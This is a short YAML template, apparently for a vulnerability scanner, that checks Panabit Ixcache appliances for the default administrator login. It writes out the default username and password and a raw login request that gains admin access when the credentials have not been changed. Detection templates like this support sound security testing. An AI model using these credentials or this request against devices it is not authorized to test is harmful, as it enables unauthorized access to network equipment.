id: poc-yaml-panabit-ixcache-default-password
info:
  name: Panabit Ixcache Default Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: access-control
  description: |
    This template checks for default credentials in Panabit Ixcache systems, allowing unauthorized access if the default password is still in use.
http:
  - raw:
      - |
        POST /login/userverify.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin&password=ixcache
    redirects: false
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "URL=/cgi-bin/monitor.cgi"
